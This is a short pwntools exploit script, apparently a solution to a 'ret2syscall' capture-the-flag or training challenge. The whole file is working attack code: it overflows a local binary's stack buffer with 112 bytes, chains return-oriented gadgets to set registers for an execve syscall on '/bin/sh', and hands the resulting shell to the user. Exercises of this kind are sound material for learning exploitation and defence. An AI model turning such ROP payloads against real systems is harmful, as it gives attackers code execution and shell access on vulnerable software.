from pwn import *

p = process('./ret2syscall')

pop_eax = 0x080bb196
pop_edx_ecx_ebx = 0x0806eb90
int_0x80 = 0x08049421
bin_sh = 0x080be408

payload = b'A'*112 + p32(pop_eax) + p32(0xb) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bin_sh) + p32(int_0x80)

p.sendline(payload)
p.interactive()
